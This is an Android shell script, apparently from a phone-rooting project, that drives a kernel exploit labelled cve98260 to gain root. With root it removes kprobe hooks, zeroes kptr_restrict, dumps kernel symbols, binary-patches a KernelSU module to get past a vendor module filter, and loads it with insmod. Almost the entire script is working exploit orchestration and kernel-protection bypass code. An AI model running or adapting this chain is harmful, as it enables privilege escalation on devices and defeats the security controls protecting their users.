#!/system/bin/sh
# run_all.sh —— 全流程在手机本地跑完（避免主机往返延迟）
# 依赖: libroot.so / attempt_fix.sh / rk.sh / cve98260/profile.framed
#       ksu-final.ko / patch_table.txt
D=/data/local/tmp
cd $D || exit 1
LOG=$D/run_all.log
: > $LOG
echo "=== start $(date +%H:%M:%S) boot=$(cat /proc/sys/kernel/random/boot_id) ===" >> $LOG

TBL_L=0xffffffc00a47d938
LM_L=0xffffffc008186f50
KO_L=0xffffffc0081bb474
SY_L=0xffffffc00815058c
KPTR_L=0xffffffc00a20d4b8
PARA_L=0xffffffc00a1fb3bc

norm() { printf '0x%x' $(( $1 )); }
rd() {  # rd <addr> -> normalized hex or empty
  o=$(./libroot.so su -c "sh $D/rk.sh $1" 2>/dev/null | sed -n 's/.* a=\(0x[0-9a-fA-F]*\).*/\1/p' | tail -1)
  [ -n "$o" ] && norm $o
}
zs() {
  rm -f $D/zs_all.log
  CVE98260_LOG=$D/zs_all.log CVE98260_ZERO_SYMS="$1" CVE98260_SELINUX_ONLY=1 PLANT_FAST=1 \
    nohup timeout -k 5 200 $D/libroot.so exploit --slide $SLIDE \
    --page-offset 0xffffff7f80000000 < $D/cve98260/profile.framed >/dev/null 2>&1 &
  i=0; while [ $i -lt 120 ]; do grep -qa parked $D/zs_all.log 2>/dev/null && break; sleep 1; i=$((i+1)); done
  pkill -9 -f 'libroot.so exploit' 2>/dev/null; sleep 1
}

# ---------- 1) root ----------
[ "$(./libroot.so su -c 'id -u' 2>/dev/null | tail -1)" = "0" ] || {
  echo "--- exploit ---" >> $LOG
  nohup sh $D/attempt_fix.sh >> $LOG 2>&1 &
  i=0; while [ $i -lt 240 ]; do
    [ "$(./libroot.so su -c 'id -u' 2>/dev/null | tail -1)" = "0" ] && break
    sleep 2; i=$((i+1))
  done
}
[ "$(./libroot.so su -c 'id -u' 2>/dev/null | tail -1)" = "0" ] || { echo ROOT_FAIL; echo ROOT_FAIL >> $LOG; exit 2; }
SLIDE=$(sed -n 2p $D/slide_cache.txt)
echo "ROOT_OK slide=$SLIDE" >> $LOG

# ---------- 2) 摘 kprobe 钩子（按 hash 只扫 3 个桶） ----------
TB=$(norm $((TBL_L + SLIDE)))
VICT=""
for tgt in $(norm $((KO_L+SLIDE))) $(norm $((SY_L+SLIDE))) $(norm $((LM_L+SLIDE))); do
  b=$(( ( tgt * 0x61C8864680B583EB ) >> 58 & 63 ))
  head=$(norm $((TB + b*8)))
  node=$(rd $head)
  n=0
  while [ -n "$node" ] && [ "$node" != "0x0" ] && [ $n -lt 40 ]; do
    a=$(rd $(norm $((node + 0x28))))
    if [ "$a" = "$tgt" ]; then
      pre=$(rd $(norm $((node + 0x40))))
      [ -n "$pre" ] && [ "$pre" != "0x0" ] && VICT="$VICT$(norm $((node + 0x40))),"
    fi
    node=$(rd $node); n=$((n+1))
  done
done
echo "victims=$VICT" >> $LOG
Z=""
if [ -n "$VICT" ]; then
  for a in $(echo "$VICT" | tr ',' ' '); do Z="$Z$(norm $((a - SLIDE))),"; done
fi
Z="$Z$(norm $((KPTR_L))),$(norm $((PARA_L)))"
zs "$Z"
echo "kptr=$(cat /proc/sys/kernel/kptr_restrict)" >> $LOG
head -1 /proc/kallsyms >> $LOG

# ---------- 3) 导出 kallsyms ----------
./libroot.so su -c "cat /proc/kallsyms > $D/ksym.txt; chmod 644 $D/ksym.txt" 2>/dev/null
case "$(head -1 $D/ksym.txt | cut -d' ' -f1)" in
  0000000000000000) echo KALLSYMS_MASKED; echo MASKED >> $LOG; exit 3;;
esac
echo "ksym ok" >> $LOG

# ---------- 4) 补丁 KO ----------
cp -f $D/ksu-final.ko $D/ksu_v.ko
awk -v want="$(cut -d' ' -f1 $D/patch_table.txt | tr '\n' ' ')" '
  BEGIN{n=split(want,a," "); for(i=1;i<=n;i++) w[a[i]]=1}
  $3 in w {print $3, $1}' $D/ksym.txt > $D/sym_addr.txt
echo "resolved=$(wc -l < $D/sym_addr.txt)" >> $LOG

while read name addr; do
  off=$(awk -v n="$name" '$1==n{print $2; exit}' $D/patch_table.txt)
  [ -z "$off" ] && continue
  esc=$(awk -v v="$addr" 'BEGIN{v=v+0;s="";for(i=0;i<8;i++){b=int(v/(2^(8*i)))%256;s=s sprintf("\\%03o",b)}printf "%s",s}')
  printf "%b" "$esc" | dd of=$D/ksu_v.ko bs=1 seek=$((off+8)) conv=notrunc 2>/dev/null
  printf '\361\377' | dd of=$D/ksu_v.ko bs=1 seek=$((off+6)) conv=notrunc 2>/dev/null
done < $D/sym_addr.txt

MO=$(grep -abo 'scmversion=g0c0fdb960178' $D/ksu_v.ko 2>/dev/null | head -1 | cut -d: -f1)
[ -n "$MO" ] && printf 'vivo_module_filter=auto\0\0' | dd of=$D/ksu_v.ko bs=1 seek=$MO conv=notrunc 2>/dev/null
echo "patched" >> $LOG

# ---------- 5) insmod + install ----------
R=$(./libroot.so su -c "cd $D; insmod ksu_v.ko allow_shell=1; echo rc=\$?; grep -i kernelsu /proc/modules" 2>&1)
echo "insmod: $R" >> $LOG
if echo "$R" | grep -qi kernelsu; then
  ./libroot.so su -c "/data/adb/ksud install" >/dev/null 2>&1
  ./libroot.so su -c "setenforce 1" >/dev/null 2>&1
  echo "SU: $(su -c 'id; getenforce' 2>&1 | head -2)" >> $LOG
  echo OK
else
  echo INSMOD_FAIL
fi
echo "=== done $(date +%H:%M:%S) ===" >> $LOG
tail -12 $LOG
